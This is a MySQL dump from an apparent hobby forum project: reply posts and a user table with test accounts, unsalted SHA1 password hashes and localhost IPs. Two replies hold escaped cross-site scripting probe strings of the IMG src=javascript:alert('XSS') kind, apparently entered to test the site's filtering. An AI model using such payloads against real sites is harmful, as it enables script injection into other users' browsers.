INSERT INTO `tg_reply` VALUES (8, 5, 'sssssss', '[b]这是一条[/b]\r\n[img]qpic/1//3.gif[/img]\r\n[i]这是二条[/i]\r\n[img]qpic/2//3.gif[/img]\r\n[u]这是三条[/u]\r\n[img]qpic/3//3.gif[/img]\r\n[s]这是四条[/s]\r\n[img]qpic/2//9.gif[/img]', '2019-02-24 19:28:26');
INSERT INTO `tg_reply` VALUES (9, 5, 'username', '实打实大稍等[img]qpic/1//12.gif[/img][img]qpic/1//12.gif[/img][img]qpic/1//12.gif[/img][img]qpic/1//12.gif[/img][img]qpic/1//12.gif[/img][img]qpic/1//12.gif[/img][img]qpic/1//12.gif[/img]', '2019-02-24 19:31:23');
INSERT INTO `tg_reply` VALUES (10, 5, 'usersfvvna', '实打实大稍等[img]qpic/1//12.gif[/img][img]qpic/1//12.gif[/img][img]qpic/1//12.gif[/img][img]qpic/1//12.gif[/img][img]qpic/1//12.gif[/img][img]qpic/1//12.gif[/img][img]qpic/1//12.gif[/img]', '2019-02-24 19:31:29');
INSERT INTO `tg_reply` VALUES (11, 4, 'username', 'vascript:alert(\\\'XSS\\\');&amp;quot;&amp;gt;\r\n&amp;lt;IMG src=javascript:alert(\\\'XSS\\\')&amp;gt;\r\n&amp;lt;IMG src=JaVaScRiPt:alert(\\\'XSS\\\')&amp;gt;\r\n&amp;lt;IMG src=JaVaScRiPt:alert(&amp;quot;XSS&amp;quot;)&amp;gt;\r\n&amp;lt;IMG src=javascript:alert(\\\'XSS\\\')&amp;gt;', '2019-02-24 20:13:45');
INSERT INTO `tg_reply` VALUES (12, 4, 'erernamew', 'vascript:alert(\\\'XSS\\\');&amp;quot;&amp;gt;\r\n&amp;lt;IMG src=javascript:alert(\\\'XSS\\\')&amp;gt;\r\n&amp;lt;IMG src=JaVaScRiPt:alert(\\\'XSS\\\')&amp;gt;\r\n&amp;lt;IMG src=JaVaScRiPt:alert(&amp;quot;XSS&amp;quot;)&amp;gt;\r\n&amp;lt;IMG src=javascript:alert(\\\'XSS\\\')&amp;gt;', '2019-02-24 20:13:51');
INSERT INTO `tg_reply` VALUES (13, 4, 'username', '', '2019-02-24 20:14:15');
INSERT INTO `tg_reply` VALUES (14, 5, 'username', '我讨厌编程\r\n我讨厌编程\r\n我讨厌编程', '2019-02-25 20:52:32');
INSERT INTO `tg_reply` VALUES (15, 4, 'erernamew', '世界上最恶心的事 就是自己写的东西 过段时间不知道什么！！！', '2019-02-25 21:08:26');

-- ----------------------------
-- Table structure for tg_user
-- ----------------------------
DROP TABLE IF EXISTS `tg_user`;
CREATE TABLE `tg_user`  (
  `tg_id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '用户id',
  `tg_uniqid` char(40) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '验证身份的唯一标识符',
  `tg_active` char(40) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '激活登录用户性质',
  `tg_level` int(1) NOT NULL DEFAULT 0 COMMENT '用户等级',
  `tg_username` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '用户名',
  `tg_password` char(40) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '密码',
  `tg_question` varchar(40) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '密码提示',
  `tg_answer` char(40) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '密码回答',
  `tg_sex` enum('男','女') CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '性别',
  `tg_face` char(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '头像',
  `tg_email` varchar(40) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL COMMENT '邮箱',
  `tg_qq` varchar(13) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL COMMENT 'QQ',
  `tg_url` varchar(40) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL COMMENT '网址',
  `tg_reg_time` datetime NOT NULL COMMENT '开始注册时间',
  `tg_loglast_time` datetime NOT NULL COMMENT '最后登录时间',
  `tg_reg_ip` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '注册IP',
  `tg_loglast_ip` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '最后登录IP',
  `tg_login_count` int(5) NOT NULL COMMENT '用户登录次数',
  PRIMARY KEY (`tg_id`) USING BTREE,
  UNIQUE INDEX `tg_id`(`tg_id`) USING BTREE,
  INDEX `tg_id_2`(`tg_id`) USING BTREE
) ENGINE = MyISAM AUTO_INCREMENT = 48 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of tg_user
-- ----------------------------
INSERT INTO `tg_user` VALUES (8, 'db5b6b0c764e98dfb9ba2c8379afe7ac04355f1f', 'aaacb7cb0bd00af7176cba1537297e01839597a1', 0, 'username1', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ad@qq.com', '354644363', '', '2019-02-06 12:48:28', '2019-02-06 12:48:28', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (7, '609dd46a37e0809f0a3913e4d8816f746d638d04', '8283bf175599949511ccc13bed44b0b3a82800ff', 1, 'username', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/m01.gif', 'sss@ss.ss', '2222222', '', '2019-02-06 12:46:58', '2019-02-25 19:38:02', '::1', '::1', 24);
INSERT INTO `tg_user` VALUES (9, '8a81f9654807e003b75921599c83d193ba6c6e51', '07975ed1bcf36e18000b3290c4b766625ecc664b', 0, 'us', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', '', '', '', '2019-02-06 16:01:07', '2019-02-06 16:01:07', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (10, '79c4f21da154ba4cf06f8c24df0be22b7aa2e404', '3ab489faae844629f549606fad8fb86185b20b28', 0, 'usern', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'fsf@qq.com', '', '', '2019-02-06 16:17:38', '2019-02-06 16:17:38', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (11, '32eeb740e4f6fd9e42dde14577d78aaa5a3f004b', '462e90361e8e3d97e524c8827c0d1d75b6ab9f9c', 0, 's', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ww@qq.com', '', '', '2019-02-06 21:00:07', '2019-02-06 21:00:07', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (12, 'e608b2c5e6aed0f7b7fbe9a97c778b713bd7bb67', 'f9e779b988ed6d93fb6957b4ef294e70cdcae3e8', 0, 'u', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', '', '2019-02-06 21:05:48', '2019-02-06 21:05:48', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (13, 'cbc9a1a9b78ae1bb60e936d045d2be62d1bddb15', '15cf1c48eb898282d2483e932dece620c891f630', 0, 'u    s  a', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'sda@qq.com', '', '', '2019-02-06 21:07:18', '2019-02-06 21:07:18', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (14, '4221fe35574260590d781fbd38deac72256b2fd4', '6a25dcef82cf345d88c6f41282676fba10b20f94', 0, '', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', '', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', '', '', '', '2019-02-06 21:41:45', '2019-02-06 21:41:45', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (15, '8cbd03ed36fe53da0afd0e054eec901a25cd496a', '5bc7f10a98e3a6916ffded5538b34a22bbae0d69', 0, 'userccc', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', '', '2019-02-06 21:48:58', '2019-02-06 21:48:58', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (16, 'f5573930dd855632ab57ff1851cddc455bbdf1ee', '7f3041261910e4160528956297b2817e4e8fae3f', 0, 'usernaddd', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', '', '2019-02-06 22:19:51', '2019-02-06 22:19:51', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (17, '2c940f8d088016c30edbe0b5182668a030e24f88', 'c6e6302f043af18241ac223a25aea2eda8cce4ce', 0, 'userss', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'sda@qq.com', '', '', '2019-02-06 22:20:55', '2019-02-06 22:20:55', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (18, 'c9a326310efac5be69cc1a8fc28f962a9591b994', 'd91bf2f45eabd776c8823a202c48b9da318bc79c', 0, 'sssssss', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'sda@qq.com', '', '', '2019-02-06 22:23:14', '2019-02-06 22:23:14', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (19, '97c60fb2270d2c64944ae84466fcd49d57ba191d', '17defde7e52a834d169b377fea0deab9efc6250b', 0, 'usernamesxx', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', '', '2019-02-06 22:23:46', '2019-02-06 22:23:46', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (20, 'e5667e61d1128c07e13720b91fb0da8bc9a24a6f', '603ae2944574b73ca0590db793bc52a903693f28', 0, 'usernssaa', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', '', '2019-02-06 22:29:51', '2019-02-06 22:29:51', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (21, '952b100b7c21ef7e2e91c1bf1c1f27c120afc523', 'b62fc24c93c7445d9fac5e3b6fa8b804f150405e', 0, 'usern335', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'sda@qq.com', '', '', '2019-02-06 22:30:19', '2019-02-06 22:30:19', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (22, '418143b2a6e9ab56abec3462349300ce4f637c98', 'eca71cbcf8b072ed9e307a5675e46c2011af721f', 0, 'users34', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', '', '2019-02-06 22:36:28', '2019-02-06 22:36:28', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (23, 'eed9921a0e1553554e223188b4315041ca9617ed', '9abfc7e0767829a53b563ee5727587c02bae3c62', 0, 'usersasf', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'sda@qq.com', '', '', '2019-02-06 22:37:06', '2019-02-06 22:37:06', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (24, '933ff6d8c2899d2d9352f269edc1073d4b137280', '4c7a8f06603c278b98652fd5816d7d70112d27e5', 0, 'useasd', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'sds@qq.qq', '', '', '2019-02-06 22:39:29', '2019-02-06 22:39:29', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (25, '81b4d46dd6458f46b10f208f98cd417ac8abe3ed', '682a995195cb5a9a7c7eb3258bb1891235027e32', 0, 'usernsda2', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'safdfasfca@Qq.com', '', '', '2019-02-06 22:45:37', '2019-02-06 22:45:37', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (26, '402a67254e6c369845fbcc80795c4a37ce5edc37', '5d1d6fcd19f9ed5915182d86342617892d8d48ac', 0, 'usernaasdme', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'safdfasfca@Qq.com', '', '', '2019-02-06 23:00:58', '2019-02-06 23:00:58', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (27, '9fb3b2c12e99c4748593e8939ce820253bcaeeda', '0eba7edaae586391b7912e96ea6f3c9d660066e4', 0, 'usesafrname', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'sda@qq.com', '', '', '2019-02-06 23:01:21', '2019-02-06 23:01:21', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (28, '45871feb85f655e6367b8056c9bda46e715fb291', 'ba7c86388f7b87207060464fafbb4349a7b367ae', 0, 'usernamxcxce', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'zx@qq.qq', '', '', '2019-02-06 23:21:28', '2019-02-06 23:21:28', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (29, '0478d2d094051cf918f133b7c3bcfd158e00c546', '', 0, 'usernafsme', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', '35sf@qq.com', '', '', '2019-02-06 23:25:22', '2019-02-06 23:25:22', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (30, 'd99fdb7e60050187d51b121df5baf27cdfacca10', '', 0, 'usesddrname', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'sda@qq.com', '', '', '2019-02-06 23:50:29', '2019-02-06 23:50:29', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (31, '2f22aded44cabb0f756eb1580832bdc3ead6d51a', '', 0, 'absolutely', '4978eb4e5c4c976a29ff9e2dcebd4220815d8fb1', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'sd@qq.qq', '', '', '2019-02-07 17:41:39', '2019-02-07 17:41:39', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (32, '8460561855b46a96d12e63203de24c5b475df48a', '', 0, 'usersfvvna', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', '', '2019-02-10 19:16:19', '2019-02-10 19:16:19', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (33, '48c9e3658fb5f215ceda2e278e640162b8078b10', '', 0, 'aasdaf', '4978eb4e5c4c976a29ff9e2dcebd4220815d8fb1', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'sd@qq.qq', '', '', '2019-02-12 16:33:11', '2019-02-12 16:33:11', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (34, 'dee500732bfed84c2f66d41212f749af235761b5', '', 0, 'aassdd', '27e95131edc7ed3c63472067ea1d95cf8f0056cf', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', '', '2019-02-12 17:11:14', '2019-02-12 17:11:14', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (35, '247c47a81ce0bd9218c9b4ddb9796c7499497053', '90c54fb4b2b7c825e551dc1cc18ad7c8e1b48380', 0, 'usernaad', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'dfsf@qq.com', '', '', '2019-02-14 20:26:28', '2019-02-14 20:26:28', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (36, '4dc1650019ce0e179229c3d8d05d6494c4a52b73', '', 0, 'erernamew', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ee@11.qq', '', '', '2019-02-14 20:27:56', '2019-02-14 20:27:56', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (37, '51773b3b0fb7ed3c965cbfb8364f3dbc3f33f9a5', '', 0, 'usernamess', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', '', '2019-02-20 20:00:50', '2019-02-20 20:00:50', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (38, '0dee390417749596f1b343c44d7d859f5b7408cd', '', 0, 'usasdfa', '4978eb4e5c4c976a29ff9e2dcebd4220815d8fb1', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', '', '2019-02-20 20:08:57', '2019-02-20 20:08:57', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (39, 'cdfa0cf60af9c4f726751df875713249b272d1fc', '', 0, 'usernass', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'dfsf@qq.com', '', 'http://baidu.com', '2019-02-20 20:10:15', '2019-02-20 20:10:15', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (40, '613a197d0f39805dc76019a3f557ec6d419452b0', '', 0, 'asdasfv', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'safdfasfca@Qq.com', '', 'http://www.baidu.com', '2019-02-20 20:16:27', '2019-02-20 20:16:27', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (41, '034d2504d24d7991628dd850861e519121302ede', '70f18c1c45577ac820ed331a277b13a10d5ed480', 0, 'usern123', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', 'http://www.baidu.com', '2019-02-20 20:17:52', '2019-02-20 20:17:52', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (42, '235bbc4e235359b4cbda8dacb751ef21c9d22a1f', '4067acad569a090e460bdc87c9bb4522216ac045', 0, 'useasffs', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', 'http://www.baidu.com', '2019-02-20 20:19:22', '2019-02-20 20:19:22', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (43, '72e6a8c1ca3f6119ad48eba2cb5b56d256998aa8', '', 0, 'userasf', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'sss@ss.ss', '', 'http://www.baidu.com', '2019-02-20 20:20:35', '2019-02-20 20:20:35', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (44, '9bf529939f00a8a22359a6e6d1f6d5aa8f03c8e5', 'c4f02a7d80ac872a5fdff72f07d3944c9e89f00d', 0, 'userxsss', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', 'http://www.baidu.com', '2019-02-24 12:11:40', '2019-02-24 12:11:40', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (45, '964d2679e1e1fcf226a3c5e131d857ebbe9ee811', 'df15af618c6d75a8f9e4da345d7e00b5ea3f9839', 0, 'userfgfd', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'dfsf@qq.com', '', 'http://www.baidu.com', '2019-02-24 12:13:59', '2019-02-24 12:13:59', '::1', '::1', 0);
INSERT INTO `tg_user` VALUES (46, 'e902ea3f1da3b64ca0ec15a0da91ca703abacdd6', '', 0, 'qqwwee', '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8', 'question', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'ss@qq.com', '', 'http://www.baidu.com', '2019-02-25 18:24:08', '2019-02-25 18:24:28', '::1', '::1', 1);
INSERT INTO `tg_user` VALUES (47, '78fd0cf83e1028e3134620af2f6f9980fc35758e', '', 0, 'xiaobai1', '7c4a8d09ca3762af61e59520943dc26494f8941b', 'tag', '25dc282b5a3dcba62a9a777a856c65dd8a4ae8c4', '男', 'face/1.jpg', 'a@qq.com', '1245678', 'http://www.baidu.com', '2019-05-02 15:49:17', '2019-05-02 15:49:34', '::1', '::1', 1);

SET FOREIGN_KEY_CHECKS = 1;
